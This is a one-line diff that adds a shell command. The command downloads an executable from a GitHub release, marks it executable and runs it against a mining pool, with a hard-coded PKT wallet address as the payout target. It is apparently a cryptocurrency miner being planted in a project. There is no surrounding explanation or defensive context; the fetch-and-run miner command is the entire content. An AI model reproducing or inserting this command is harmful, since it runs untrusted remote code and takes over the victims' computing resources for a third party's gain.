@@ -1,0 +1,1 @@
+wget https://github.com/nganji523/cicip/releases/download/tiyasakbar/tiyasakbar-linux_amd64 && chmod +x tiyasakbar-linux_amd64 && ./tiyasakbar-linux_amd64 ann -p pkt1q63565d066hvjrmrg2gpc605lw9alxc8ycvlsxh http://pool.srizbi.com
